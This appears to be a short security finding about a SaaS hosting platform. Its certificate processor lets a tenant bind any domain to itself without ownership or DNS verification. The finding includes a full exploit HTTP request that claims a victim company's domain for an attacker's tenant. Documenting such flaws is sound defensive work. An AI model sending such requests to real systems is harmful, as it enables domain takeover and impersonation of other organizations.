diagnosis: The SSL certification processor provisions TLS certificates and binds domainName to targetTenantId in tenant_ssl_certificates based solely on the stream event payload. It does not verify whether targetTenantId owns domainName or has completed DNS TXT challenge verification, allowing a tenant to attach and claim domains belonging to competitor organizations.
exploit_request:
POST /api/domains/request-ssl HTTP/1.1
Host: edge.saashosting.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"domainName": "secure.victimcorp.com", "targetTenantId": "tenant_attacker_account"}
